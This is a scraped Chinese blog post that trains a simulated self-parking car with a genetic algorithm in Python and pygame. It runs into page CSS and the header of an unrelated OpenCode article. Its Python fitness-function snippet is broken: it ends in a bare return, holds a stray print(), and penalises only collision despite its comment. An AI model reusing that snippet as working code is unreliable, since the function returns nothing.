pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、 背景</h3>
<p>我曾经使用遗传算法常用于解决旅行商问题，认为遗传算法解决问题的关键是对问题编码。看到了一篇有趣的技术博文【1】，介绍使用<strong>遗传算法（Genetic Algorithm, GA）</strong> 训练小车在模拟环境中实现自动泊车。尽管文章中对泊车问题编码的思路非常精彩，但是使用 Three.js 进行算法实现和可视化的，对后端选手不太友好😢。在复现的过程中，参考了博文【1】的算法思路，为了避免碰撞，优化了损失函数。本文使用python实现算法，并使用pygame库进行可视化，源码上传了git仓库（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flcmchn%2Fself-parking-genetic" target="_blank" title="https://github.com/lcmchn/self-parking-genetic" ref="nofollow noopener noreferrer">github.com/lcmchn/self…</a>）。</p>
<h3 data-id="heading-1">二、 算法设计</h3>
<p>首先要理解本算法设计的核心思想：</p>
<pre><code class="hljs">自动泊车的本质是 “小车根据环境（障碍物）调整动作（行驶、转向），最终精准停靠目标车位”。本文用进化（遗传算法）的方式“训练”小车学会这一过程，而不是手动编写规则。
</code></pre>
<p>然后大家在阅读本文前思考几个问题，这是本文解决泊车任务的关键：</p>
<p>👀 感知（看）：小车如何获取周围环境信息？ 🤔 决策（想）：如何根据环境信息生成动作指令？ 📖 优化（学）：如何让小车通过迭代 “学会” 最优决策逻辑？</p>
<p>为了解决上面三个问题，本文先对小车建模，然后利用遗传算法进化小车的“大脑”。下面分别介绍。</p>
<h4 data-id="heading-2">2.1 小车控制建模</h4>
<p>为了简化模型，小车的动作被抽象为两个独立维度的信号，每个信号仅 3 种状态。小车每隔一定步长（本文为100ms）接收一次动作信号，然后执行。</p>
<h5 data-id="heading-3">2.1.1 发动机信号</h5>















<table><thead><tr><th>-1</th><th>0</th><th>+1</th></tr></thead><tbody><tr><td>倒车</td><td>静止</td><td>前进</td></tr></tbody></table>
<h5 data-id="heading-4">2.1.2 方向盘信号</h5>















<table><thead><tr><th>-1</th><th>0</th><th>+1</th></tr></thead><tbody><tr><td>左转</td><td>直行</td><td>右转</td></tr></tbody></table>
<h5 data-id="heading-5">2.1.3 8方位距离传感器</h5>
<p>每辆小车拥有<strong>8个距离传感器</strong>，检测与障碍物的距离，使小车拥有感知周围环境的能力。每隔一定步长（本文为100ms）传感器输出 8 个浮点数（对应 8 个传感器的距离值），作为大脑决策系统的输入。当监测范围内（4m）无障碍物，传感器数值为0；当传感器数值很小但不为0，表示障碍物就在附近。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dff4733e61f401b916a021be74fc2df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTM3Nzk0MDQ5OTkz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982907&amp;x-signature=MsAx3qsFlTUqNC9DyiCn1qYiWjs%3D" alt="image-20260114110607589.png" loading="lazy"/></p>
<h5 data-id="heading-6">2.1.4 大脑决策系统</h5>
<p>小车的大脑决策系统实现了由“感知”到“动作”的转换：距离传感器输入， 动作信号输出。本文算法通过一个简单的<strong>线性函数+信号转换</strong>建模：</p>
<ul>
<li>信号表达：</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">--&gt;发动机信号
engineSignal = <span class="hljs-built_in">brainToMuscleSignal</span>(
  (e0 * sensor0) + (e1 * sensor1) + ... + (e7 * sensor7) + ebias <span class="hljs-comment">// &lt;- brainFunction</span>
)
​
--&gt;方向盘信号
wheelSignal = <span class="hljs-built_in">brainToMuscleSignal</span>(
  (w0 * sensor0) + (w1 * sensor1) + ... + (w7 * sensor7) + wbias <span class="hljs-comment">// &lt;- brainFunction</span>
)
sensor<span class="hljs-selector-attr">[i]</span>：小车周围<span class="hljs-number">8</span>方位距离传感器，返回到障碍物的距离。
e<span class="hljs-selector-attr">[i]</span>、ebias、w<span class="hljs-selector-attr">[i]</span>、wbias：可学习的权重参数（即“基因”）。
</code></pre>
<ul>
<li>信号转换函数：brainToMuscleSignal()函数实现“多项式输出→动作信号” 的映射。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">--&gt;sigmoid函数
将多项式输出的任意浮点数压缩到 (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>) 区间（归一化）
​
--&gt;阈值划分
(<span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>)→-<span class="hljs-number">1</span>，(<span class="hljs-number">0.1</span>, <span class="hljs-number">0.9</span>)→<span class="hljs-number">0</span>，(<span class="hljs-number">0.9</span>,<span class="hljs-number">1</span>)→+<span class="hljs-number">1</span>（通过 <span class="hljs-attribute">margin</span> 参数控制阈值范围,-<span class="hljs-number">1</span>\<span class="hljs-number">0</span>+<span class="hljs-number">1</span>就是需要的动作信号！！）
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbd517ae79224531b2df55f3b4d9a08b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTM3Nzk0MDQ5OTkz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982907&amp;x-signature=rcqeS3fR7p9BcEKrfrYEc4HyI1M%3D" alt="image-20260109114245231.png" loading="lazy"/></p>
<h5 data-id="heading-7">2.1.5 基因</h5>
<p>每个个体（一辆小车）的“基因”就是其线性控制函数的所有权重和偏置（e0-e7、ebias、w0-w7、wbias 共 18 个系数）：</p>
<ul>
<li>编码规则：系数为浮点数，用 10 位二进制表示（1 位符号位 + 4 位指数位 + 5 位尾数位，平衡精度与长度）。</li>
<li>基因组长度：18 个系数 × 10 位 = 180 位（0/1 序列），确保 “遗传操作（交叉、变异）” 可高效执行。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62dbf800f676463098d3a6ae45754e65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTM3Nzk0MDQ5OTkz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982907&amp;x-signature=Ch%2FLnjuw5pDXe1gjK79357GLOII%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-8">2.2 利用遗传算法进化小车的“大脑”</h4>
<p>为了得到优秀的基因（180位0/1 序列），解决自动泊车问题。本算法使用遗传算，模拟自然选择，迭代产生更优个体。下图为算法的关键步骤和流程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cad7078366db4d53a3548ff029b3eff3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTM3Nzk0MDQ5OTkz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982907&amp;x-signature=B30DPg3OxRPe%2BqCFgdCDaEPm8r8%3D" alt="image-20260109111234442.png" loading="lazy"/></p>
<h5 data-id="heading-9">2.2.2 关键步骤</h5>

































<table><thead><tr><th>遗传算法概念</th><th>泊车任务实现</th></tr></thead><tbody><tr><td>个体（Individual）</td><td>一个小车基因组（180位0/1 序列）</td></tr><tr><td>种群（Population）</td><td>一代小车的集合（默认 1000 个个体）</td></tr><tr><td>适应度函数（Fitness Function）</td><td>基于 “车轮到车位角的平均距离” 计算：fitness = 1 / (loss + 1)，其中 loss 是 4 个车轮到车位 4 个角的平均距离（距离越近，fitness 越高） <strong>🔑 加入碰撞惩罚项：发生碰撞直接将适应度降至1%</strong></td></tr><tr><td>选择（Selection）</td><td>加权随机选择：适应度越高的个体，被选中作为父母的概率越大；同时保留 10%“最优个体” 直接进入下一代（避免优质基因丢失）</td></tr><tr><td>交叉（Crossover）</td><td>均匀交叉：父母基因组的每一位以 50% 概率遗传给子女（模拟基因重组）</td></tr><tr><td>变异（Mutation）</td><td>随机变异：每个基因位以 4% 概率翻转（0→1 或 1→0，引入新基因多样性）</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df5ab2cae5ba44bc8c3395cf8143c24d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTM3Nzk0MDQ5OTkz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982907&amp;x-signature=Sl4wiUnUuworxpRfyNNjLQ9Kxcc%3D" alt="图片11.png" loading="lazy"/></p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">car_fitness_from_loss</span>(<span class="hljs-params">loss: <span class="hljs-built_in">float</span>, has_collision: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>, is_loop: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
                              is_timeout: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-string">"""
        增强版适应度函数：
        - loss越小（离车位越近），适应度越高
        - 碰撞大幅惩罚适应度
        """</span>
        base_fitness = <span class="hljs-number">1.0</span> / (loss + <span class="hljs-number">1e-6</span>)
​
        <span class="hljs-comment"># 惩罚项：碰撞/循环/超时直接将适应度降至1%</span>
        <span class="hljs-keyword">if</span> has_collision:
            base_fitness *= <span class="hljs-number">0.01</span>
​
        <span class="hljs-comment"># 额外奖励：离车位足够近（&lt;50像素）时翻倍奖励</span>
        <span class="hljs-keyword">if</span> loss &lt; <span class="hljs-number">50</span>:
            <span class="hljs-built_in">print</span>()
            base_fitness *= <span class="hljs-number">2.0</span>
​
        <span class="hljs-keyword">return</span> 
</code></pre>
<h5 data-id="heading-10">2.2.3 算法流程</h5>
<ol start="0">
<li>
<p>初始化种群（N 辆随机小车）。</p>
</li>
<li>
<p>对每辆车：</p>
<ul>
<li>在仿真环境中运行其控制策略。</li>
<li>计算适应度（评价基因好坏）。</li>
</ul>
</li>
<li>
<p>根据适应度选择、交叉、变异，生成新一代种群。</p>
</li>
<li>
<p>重复步骤 2–3，直到某代出现能成功泊车的小车，或达到最大代数。</p>
</li>
</ol>
<h3 data-id="heading-11">三、结果可视化</h3>
<p>初始代的小车的”基因“是随机的，完全没有自动泊车的能力：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7b3ac749ea640f5997cf4c3f83e39e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTM3Nzk0MDQ5OTkz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982907&amp;x-signature=gx%2FFLkmKC8vL8XW%2F9Yvc0GkP%2BYg%3D" alt="20260114-114123.gif" loading="lazy"/></p>
<p>遗传算法训练50代后，小车掌握了自动泊车的能力，基本能停靠在目标车位附近：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a51d3eb9266c4d5c83ebeffc09b38e8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTM3Nzk0MDQ5OTkz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982907&amp;x-signature=6WNBxDZHArwUg1Fv0ALogweVZvY%3D" alt="20260114-101612 (1).gif" loading="lazy"/></p>
<p>平均适应度随着迭代呈上升趋势，说明算法正在有效筛选优质基因，种群整体的泊车能力在持续提升。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1718e68e65ea4b058db78cc7fdfcdc70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTM3Nzk0MDQ5OTkz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982907&amp;x-signature=8bgTmb4r8JkywH7csVo8Js%2B%2FmCA%3D" alt="image-20260114124558709.png" loading="lazy"/></p>
<h3 data-id="heading-12">四、总结与反思</h3>
<p>虽然本文的算法不适合直接用于真实自动驾驶（训练的小车一路上有时会撞到别的车，而且停车位也停得不准确），但为理解机器学习、优化算法和机器人控制提供了起点。下面是针对本文算法的几点反思：</p>
<ul>
<li>当前使用<strong>线性控制器</strong>过于简单，难以泛化到不同车位布局或初始位置。</li>
<li>若想提升性能，应改用<strong>多层感知机（MLP）</strong> 作为控制器（即神经网络）。</li>
<li>当前策略倾向于“一直倒车找空位”，缺乏复杂机动（如前进+后退配合）。</li>
</ul>
<h3 data-id="heading-13">五、参考文献</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.to%2Ftrekhleb%2Fself-parking-car-in-500-lines-of-code-58ea" target="_blank" title="https://dev.to/trekhleb/self-parking-car-in-500-lines-of-code-58ea" ref="nofollow noopener noreferrer">dev.to/trekhleb/se…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenCode 上手初体验：从安装到基础使用]]></title>    <link>https://juejin.cn/post/7594813727053905954</link>    <guid>https://juejin.cn/post/7594813727053905954</guid>    <pubDate>2026-01-14T09:07:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594813727053905954" data-draft-id="7594817135128707106" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenCode 上手初体验：从安装到基础使用"/> <meta itemprop="keywords" content="AI编程,GitHub"/> <meta itemprop="datePublished" content="2026-01-14T09:07:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wangruofeng"/> <meta itemprop="url" content="https://juejin.cn/user/712139266070296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenCode 上手初体验：从安装到基础使用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139266070296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wangruofeng
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:07:15.000Z" title="Wed Jan 14 2026 09:07:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class 